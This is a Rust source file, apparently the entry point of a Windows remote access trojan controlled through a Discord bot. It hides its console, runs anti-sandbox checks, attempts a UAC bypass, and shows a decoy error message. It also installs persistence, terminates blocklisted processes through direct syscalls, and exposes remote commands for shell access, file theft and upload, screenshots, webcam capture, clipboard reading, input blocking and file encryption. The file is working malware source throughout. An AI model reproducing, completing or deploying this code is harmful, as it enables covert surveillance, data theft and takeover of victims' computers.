#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
#![allow(dead_code)]

use std::env;
use std::sync::Arc;

mod commands;
mod config;
mod core;
mod error;
mod installation;
mod prelude;
mod system_info;
pub mod types;
mod uac_bypass;
mod utils;

use crate::prelude::*;
use crate::config::Config;
use crate::core::decoy::show_fake_error;
use crate::core::instance::singleton_prcess;
use crate::core::keep_active::start_keep_active;
use crate::core::exit_patcher::safe_exit;
use crate::core::shutdown::get_shutdown_manager;

use commands::core as core_cmds;
use commands::crypto as crypto_cmds;
use commands::filesystem as fs_cmds;
use commands::system as sys_cmds;
use commands::utility as util_cmds;
use commands::network as net_cmds;

fn run_saa(skip_delay: bool) -> bool {
    use crate::core::anti_analysis::{run_checks, AntiAnalysisConfig, EvasionAction, random_delay};

    let config = AntiAnalysisConfig {
        min_score_threshold: 100,
        delay_range: (30, 90),
        action: EvasionAction::DelayThenExit,
        startup_delay: !skip_delay,
    };

    let result = run_checks(&config);

    if result.is_detected {
        log_debug!("Anti Analysis ----------");
        log_debug!("  - Total Score: {}", result.total_score);
        for detection in &result.detections {
            log_debug!("  - [{}]: {} (Weight: {})", detection.category, detection.reason, detection.weight);
        }
        log_debug!("Exiting...");

        random_delay(config.delay_range);
        safe_exit(0);
    }

    false
}

fn run_softaa() -> Option<Vec<String>> {
    use crate::core::anti_analysis::{run_checks, AntiAnalysisConfig, EvasionAction};

    let config = AntiAnalysisConfig {
        min_score_threshold: 30,
        delay_range: (0, 0),
        action: EvasionAction::ReportOnly,
        startup_delay: false,
    };

    let result = run_checks(&config);

    if result.is_detected {
        let mut reasons = Vec::new();
        for detection in &result.detections {
            let msg = format!("[{}]: {}", detection.category, detection.reason);
            reasons.push(msg);
        }
        return Some(reasons);
    }

    None
}

fn setup_exit_protection() -> bool {
    use crate::core::exit_patcher;

    match exit_patcher::patch_exit() {
        true => {
            let patched = exit_patcher::get_patched_functions();
            log_debug!("[ExitPatcher] Successfully patched {} exit functions", patched.len());
            for func in &patched {
                log_debug!("  - {}", func);
            }
            true
        }
        false => {
            log_debug!("[ExitPatcher] Failed to patch exit functions");
            false
        }
    }
}

// Build all poise commands
fn get_all_commands() -> Vec<poise::Command<Data, Error>> {
    vec![
        // Core commands
        core_cmds::ping(),
        core_cmds::help(),
        core_cmds::info(),
        core_cmds::shell(),
        core_cmds::run(),
        core_cmds::exit(),
        core_cmds::uninstall(),
        
        // Crypto commands
        crypto_cmds::encrypt(),
        crypto_cmds::decrypt(),
        
        // Filesystem commands
        fs_cmds::cat(),
        fs_cmds::cd(),
        fs_cmds::ls(),
        fs_cmds::mkdir(),
        fs_cmds::remove(),
        fs_cmds::rename(),
        fs_cmds::size(),
        fs_cmds::download(),
        fs_cmds::upload(),
        fs_cmds::get(),
        fs_cmds::fileinfo(),
        fs_cmds::checkdrive(),
        fs_cmds::clear(),
        fs_cmds::zip(),
        fs_cmds::unzip(),
        fs_cmds::unrar(),
        fs_cmds::grab(),
        
        // System commands
        sys_cmds::process(),
        sys_cmds::volume(),
        sys_cmds::screen(),
        sys_cmds::host(),
        sys_cmds::blockinput(),
        sys_cmds::update(),
        sys_cmds::visible(),
        sys_cmds::capsflicker(),
        sys_cmds::winkill(),
        
        // Utility commands
        util_cmds::clipboard(),
        util_cmds::screenshot(),
        util_cmds::webcam(),
        util_cmds::foreground(),
        util_cmds::jumpscare(),
        util_cmds::openurl(),
        util_cmds::playsound(),
        util_cmds::print(),
        
        // Network commands
        net_cmds::ipconfig(),
    ]
}

async fn on_ready(
    ctx: &serenity::Context,
    ready: &serenity::Ready,
    _framework: &poise::Framework<Data, Error>,
) -> Result<Data, Error> {
    log_debug!("Bot is ready! Logged in as {}", ready.user.name);
    
    let guild_id = Config::get_guildid();
    let guild_id = GuildId::new(guild_id);
    
    let channel_manager = crate::core::discord::channel::ChannelManager::new(
        ctx.http.clone(),
        guild_id,
    );
    
    let device_channel_id = channel_manager.init_dchannel().await?;
    log_debug!("Device channel initialized: {}", device_channel_id);
    
    let shutdown_manager = get_shutdown_manager();
    let shutdown_token = shutdown_manager.token();

    let wifi_config = Config::get_wifi_monitor_config();
    let wifi_monitor = crate::core::wifi_monitor::WifiMonitor::new(
        ctx.http.clone(),
        device_channel_id,
        wifi_config
    ).with_shutdown_token(shutdown_token.clone());

    if let Err(e) = wifi_monitor.start_monitoring().await {
        log_debug!("Failed to start WiFi monitoring: {}", e);
    }

    Ok(Data {
        device_channel_id,
        guild_id,
        caps_active: Arc::new(std::sync::atomic::AtomicBool::new(false)),
        shutdown_token,
    })
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    #[cfg(not(debug_assertions))]
    {
        unsafe {
            let console = winapi::um::wincon::GetConsoleWindow();
            if !console.is_null() {
                winapi::um::winuser::ShowWindow(console, winapi::um::winuser::SW_HIDE);
            }
        }
    }

    if Config::SHOW_CONSOLE {
        crate::utils::logger::init_logger();
    }

    let args: Vec<String> = env::args().collect();
    let hide_decoy_flag = args.contains(&"--hide-decoy".to_string());

    let is_admin_privileged = uac_bypass::is_admin();

    #[cfg(debug_assertions)]
    log_debug!("[Anti-Analysis] Running checks (pre-UAC)");
    
    run_saa(is_admin_privileged);
    
    #[cfg(debug_assertions)]
    log_debug!("[Anti-Analysis] Checks passed!");

    #[cfg(not(debug_assertions))]
    {
        crate::core::evasion::init_evasion();
    }

    // UAC Bypass
    if !is_admin_privileged {
        #[cfg(debug_assertions)]
        println!("Attempting UAC elevation...");

        if uac_bypass::attempt_uac_bypass() {
            #[cfg(debug_assertions)]
            println!("Elevation successful");
            std::thread::sleep(std::time::Duration::from_millis(100));
            std::process::exit(0);
        }
    }

    singleton_prcess(is_admin_privileged);

    // Exit protection
    #[cfg(not(debug_assertions))]
    {
        if setup_exit_protection() {
            log_debug!("[ExitPatcher] Exit protection enabled");
        }
    }

    let current_exe = env::current_exe().unwrap_or_default();
    let is_installed = installation::check_if_installed(&current_exe);

    // Decoy message
    let decoy_config = Config::get_decoy_config();
    if decoy_config.enabled && !hide_decoy_flag {
        std::thread::spawn(move || {
            show_fake_error(&decoy_config);
        });
    }

    // Keep-active thread
    let keep_active_config = Config::get_keep_active_config();
    let _keep_active_thread = start_keep_active(&keep_active_config);

    // Installation
    if !is_installed {
        log_debug!("Starting installation process...");

        match installation::install_to_path() {
            Ok(_) => log_debug!("Installation completed successfully!"),
            Err(e) => log_debug!("Installation failed: {}", e),
        }

        if Config::SHOW_CONSOLE {
            std::thread::sleep(std::time::Duration::from_secs(2));
        }
        safe_exit(0);
    }

    // Startup Persistence
    match crate::core::startup::check_startup().await {
        Ok(_) => log_debug!("Startup persistence configured!"),
        Err(e) => log_debug!("Startup persistence failed: {}", e),
    }

    // Authentication
    let auth_config = Config::get_auth_config();
    if let Err(e) = crate::core::auth::init_auth_manager(auth_config) {
        log_debug!("Auth manager initialization: {}", e);
    }

    // Get config
    let token = Config::get_token();

    // Get shutdown manager for blocklist monitor
    let shutdown_manager = get_shutdown_manager();
    let blocklist_token = shutdown_manager.token();

    // Blocklist Process Monitor with cancellation support
    tokio::spawn(async move {
        use crate::utils::syscall::{self, access};
        use std::collections::HashSet;
        use std::fs;

        fn load_blocklist() -> HashSet<String> {
            let path = installation::get_install_path().join("blocklist.json");
            if let Ok(content) = fs::read_to_string(&path) {
                content.lines()
                    .filter(|l| !l.is_empty())
                    .map(|l| {
                        let name = l.trim().to_lowercase();
                        if name.ends_with(".exe") {
                            name[..name.len()-4].to_string()
                        } else {
                            name
                        }
                    })
                    .collect()
            } else {
                HashSet::new()
            }
        }

        fn kill_process_by_pid(pid: u32) -> bool {
            if let Some(handle) = syscall::nt_open_process(pid, access::PROCESS_TERMINATE) {
                let success = syscall::nt_terminate_process(handle, 1);
                syscall::nt_close(handle);
                success
            } else {
                false
            }
        }

        let mut killed_pids: HashSet<u32> = HashSet::new();

        loop {
            // Check for shutdown signal
            tokio::select! {
                biased;
                _ = blocklist_token.cancelled() => {
                    log_debug!("[BlockMonitor] Shutdown signal received");
                    break;
                }
                _ = tokio::time::sleep(tokio::time::Duration::from_millis(300)) => {
                    // Continue with monitoring
                }
            }

            let blocklist = load_blocklist();

            if !blocklist.is_empty() {
                let processes = syscall::get_process_list();
                for (pid, name) in processes {
                    if killed_pids.contains(&pid) {
                        continue;
                    }

                    let proc_name = name.to_lowercase();
                    let proc_name_base = if proc_name.ends_with(".exe") {
                        &proc_name[..proc_name.len()-4]
                    } else {
                        &proc_name
                    };

                    if blocklist.contains(proc_name_base) {
                        if kill_process_by_pid(pid) {
                            killed_pids.insert(pid);
                            log_debug!("[BlockMonitor] Killed: {} (PID: {})", proc_name, pid);
                        }
                    }
                }

                let running: HashSet<u32> = syscall::get_process_list()
                    .into_iter()
                    .map(|(pid, _)| pid)
                    .collect();
                killed_pids.retain(|pid| running.contains(pid));
            }
        }

        log_debug!("[BlockMonitor] Monitor stopped gracefully");
    });

    log_debug!("Prefix: {}", Config::BOT_PREFIX);
    log_debug!("Starting Poise framework...");

    // Build Poise framework
    let framework = poise::Framework::builder()
        .options(poise::FrameworkOptions {
            commands: get_all_commands(),
            prefix_options: poise::PrefixFrameworkOptions {
                prefix: Some(Config::BOT_PREFIX.to_string()),
                case_insensitive_commands: true,
                ..Default::default()
            },
            // Only process commands from this bot's own device channel
            command_check: Some(|ctx| {
                Box::pin(async move {
                    let device_channel_id = ctx.data().device_channel_id;
                    let message_channel_id = ctx.channel_id();
                    
                    // Only allow commands in this device's channel
                    Ok(message_channel_id == device_channel_id)
                })
            }),
            on_error: |error| Box::pin(async move {
                log_debug!("Poise error: {:?}", error);
            }),
            ..Default::default()
        })
        .setup(|ctx, ready, framework| {
            Box::pin(on_ready(ctx, ready, framework))
        })
        .build();

    // Build Serenity client
    let intents = serenity::GatewayIntents::GUILD_MESSAGES 
        | serenity::GatewayIntents::MESSAGE_CONTENT
        | serenity::GatewayIntents::GUILDS;

    let mut client = serenity::ClientBuilder::new(&token, intents)
        .framework(framework)
        .await?;

    let shutdown_manager = get_shutdown_manager();
    tokio::spawn(async move {
        match tokio::signal::ctrl_c().await {
            Ok(()) => {
                shutdown_manager.shutdown().await;
            }
            Err(e) => {
                log_debug!("[Shutdown] Failed to listen for Ctrl+C: {}", e);
            }
        }
    });

    if let Err(why) = client.start().await {
        log_debug!("Client error: {:?}", why);
    }

    Ok(())
}